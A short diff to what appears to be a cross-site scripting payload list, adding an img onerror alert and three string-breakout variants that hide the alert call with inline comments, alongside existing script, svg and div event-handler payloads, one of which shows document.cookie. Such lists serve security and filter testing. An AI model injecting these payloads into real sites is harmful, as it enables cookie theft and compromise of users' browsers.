@@ -3,3 +3,7 @@
 "><script>alert(document.cookie)</script>
 /><svg src=x onload=confirm("1337");>
 "><div onmouseover="alert('XSS');">Hello :)
+"><img src=x onerror=alert(1)>
+'-alert(1)-'
+'-alert/**/(1)-'
+'-alert/*any*/(1)-'
